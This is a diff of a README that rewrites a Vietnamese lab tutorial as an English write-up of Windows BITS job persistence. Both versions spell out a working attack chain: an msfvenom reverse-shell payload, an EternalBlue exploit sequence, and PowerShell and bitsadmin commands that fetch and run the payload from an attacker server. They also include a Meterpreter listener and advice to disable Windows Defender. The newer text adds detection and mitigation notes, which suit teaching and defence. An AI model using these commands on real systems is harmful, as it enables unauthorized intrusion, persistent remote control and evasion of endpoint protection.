@@ -1,121 +1,115 @@
-# BITS-Job-Persistence
+# Exploiting BITS Jobs for Persistence
 
-## 📌 Giới Thiệu
+## 1. Introduction
 
-**BITS Job Persistence** là kỹ thuật sử dụng Background Intelligent Transfer Service (BITS) để tải xuống và thực thi payload độc hại trên máy Windows, giúp duy trì persistence.
-
-
-
-## 🔧 1. Môi Trường Lab
-
-### Yêu Cầu Phần Mềm
-✅ VMware Workstation / VirtualBox  
-✅ Kali Linux (máy tấn công)  
-✅ Windows 10 (máy nạn nhân)  
-✅ Metasploit Framework  
-
-### Cấu Trúc Lab
-- **Kali Linux**: Máy tấn công chạy Metasploit, đóng vai trò máy chủ C2.
-- **Windows 10**: Máy nạn nhân, nơi khai thác BITS Job Persistence.
-- **Mạng**: Bridged/NAT để hai máy có thể giao tiếp.
+Background Intelligent Transfer Service (BITS) is a Windows service designed for low-bandwidth, asynchronous file transfers. It is commonly used by Windows Update, messaging applications, and other background services that require efficient file transfer without disrupting network performance. However, adversaries can abuse BITS jobs for malicious purposes, including persistent code execution, downloading and executing payloads, and exfiltrating data.
 
 ---
 
-## 🎯 2. Cấu Hình Máy Ảo
+## 2. Understanding BITS Jobs and Why They Are Exploitable
 
-### Kali Linux (Máy tấn công)
-- RAM: **2GB+**, Disk: **20GB+**
-- Cập nhật hệ thống:
-```bash
-sudo apt update && sudo apt upgrade -y
-```
-- Cài Metasploit nếu chưa có:
-```bash
-sudo apt install metasploit-framework -y
-```
+BITS operates by creating and managing jobs that handle file transfers. These jobs can be configured to:
+- Download and execute files
+- Run commands upon completion or failure
+- Store job configurations in a database, avoiding registry modifications
+- Persist across reboots with a default maximum lifetime of 90 days (extendable)
 
-### Windows 10 (Máy nạn nhân)
-- RAM: **4GB+**, Disk: **40GB+**
-- Tắt Windows Defender (hoặc tạo ngoại lệ cho folder test).
-- BITS Service mặc định luôn chạy.
+The BITS interface can be accessed via:
+- PowerShell (`Start-BitsTransfer`, `Get-BitsTransfer`)
+- BITSAdmin tool (`bitsadmin /transfer`)
+
+Since BITS jobs are often allowed by host firewalls and do not create obvious new files, they provide a stealthy mechanism for attackers to execute malicious code and maintain persistence on a target system.
 
 ---
 
-## 🚀 3. Tạo Payload Metasploit
+## 3. Attack Scenario: Persistence via BITS Jobs
 
-Trên Kali Linux, tạo payload:
-```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_KALI> LPORT=4444 -f exe > /var/www/html/payload.exe
-```
-- **LHOST**: IP của Kali Linux.
-- **LPORT**: Cổng listener.
+### 3.1. Lab Setup
 
-Khởi chạy server trên Kali:
-```bash
-sudo systemctl start apache2
-```
-Kiểm tra payload:
-```bash
-ls /var/www/html/payload.exe
-```
+This attack is demonstrated in a controlled lab environment using VMware Workstation. The setup consists of:
+- **Attacker:** Kali Linux (running Metasploit Framework)
+- **Victim:** Windows 10 (BITS service enabled)
+- **Network Configuration:** Host-only or bridged network mode to allow direct communication
 
----
+### 3.2. Attack Execution
 
-## 🔥 4. Khai Thác BITS Job Persistence
+#### Step 1: Gaining Initial Access
 
-Trên Windows 10, mở **PowerShell (Admin)** và chạy:
-```powershell
-$job = Start-BitsTransfer -Source "http://<IP_KALI>/payload.exe" -Destination "C:\Users\Public\payload.exe"
-Set-BitsTransfer -JobId $job -NotifyCmdLine "C:\Users\Public\payload.exe"
-Complete-BitsTransfer -JobId $job
-```
-📌 **Giải thích:**
-- Tải `payload.exe` về `C:\Users\Public`.
-- Cấu hình `NotifyCmdLine` để thực thi payload.
-- **Persistence**: Nếu job chưa hoàn tất, nó sẽ tiếp tục chạy sau restart.
-
----
-
-## 🎯 5. Thiết Lập Listener trên Kali
-
-Trên Kali, chạy Metasploit:
+The attacker first establishes access to the victim machine. This can be achieved using Metasploit’s exploit modules, such as:
 ```bash
 msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST <victim-IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker-IP>
+exploit
 ```
-Cấu hình listener:
+Once access is obtained, the attacker deploys persistence via BITS jobs.
+
+#### Step 2: Creating a Malicious BITS Job
+
+On the compromised Windows machine, the attacker executes PowerShell commands to create a persistent BITS job:
+```powershell
+$job = Start-BitsTransfer -Source "http://attacker-server/payload.exe" -Destination "C:\Users\Public\payload.exe"
+bitsadmin /create /download MaliciousJob
+bitsadmin /addfile MaliciousJob "http://attacker-server/payload.exe" "C:\Users\Public\payload.exe"
+bitsadmin /setnotifycmdline MaliciousJob "C:\Users\Public\payload.exe" ""
+bitsadmin /resume MaliciousJob
+```
+This command sequence:
+- Downloads a payload from the attacker's server
+- Saves it to a writable directory (`C:\Users\Public\`)
+- Configures the job to execute the payload once the transfer is complete
+- Resumes the job to trigger execution
+
+#### Step 3: Achieving Persistence
+
+Since BITS jobs persist in the system’s job queue, they remain active even after reboots. To confirm persistence, the attacker can run:
+```powershell
+Get-BitsTransfer | Format-Table -AutoSize
+```
+If the system is restarted, the job will still exist, allowing the payload to be re-executed.
+
+---
+
+## 4. Setting Up a Listener on Kali Linux
+
+To capture the reverse shell, the attacker sets up a Metasploit listener:
 ```bash
+msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-set LHOST <IP_KALI>
+set LHOST <attacker-IP>
 set LPORT 4444
 exploit
 ```
-📌 Khi BITS job hoàn thành, payload sẽ kết nối đến Kali, tạo **Meterpreter session**.
+When the victim executes the payload, a Meterpreter session is established, giving the attacker control over the compromised system.
 
 ---
 
-## 🔍 6. Kiểm Tra Kết Nối & Duy Trì Persistence
+## 5. Detecting and Mitigating BITS Job Abuse
 
-📌 Nếu khai thác thành công, ta sẽ có **Meterpreter Session**:
-```bash
-meterpreter > sysinfo
-meterpreter > shell
+### 5.1. Detection
+
+Administrators can monitor for suspicious BITS jobs by running:
+```powershell
+Get-BitsTransfer -AllUsers | Select-Object -Property DisplayName, JobState, Owner, TransferType, NotifyCmdLine
 ```
+Additionally, security logs and endpoint detection tools can help identify unexpected BITS activity.
 
----
+### 5.2. Mitigation
 
-## 🛠 7. Xóa BITS Job & Dấu Vết
-
-🗑️ Xóa tất cả BITS Job trên Windows:
+To remove suspicious BITS jobs, execute:
 ```powershell
 Get-BitsTransfer | Remove-BitsTransfer
 ```
-📌 Kiểm tra lại:
-```powershell
-bitsadmin /list /allusers
-```
+To further secure the system:
+- Restrict BITS job creation to trusted applications using Group Policy
+- Monitor and log BITS activity for anomalous behavior
+- Use application whitelisting to prevent unauthorized execution
 
 ---
 
-## ⚠️ Cảnh Báo
-🚨 **Chỉ sử dụng kỹ thuật này trong môi trường lab hoặc với sự cho phép hợp pháp!** 🚨
+## 6. Conclusion
+
+BITS Job Persistence is a stealthy technique that attackers can use to maintain access on a Windows system. By leveraging the native BITS service, adversaries can execute payloads, evade detection, and maintain persistence without modifying the registry or creating new scheduled tasks. Understanding this technique is crucial for defenders to detect and mitigate such attacks effectively.
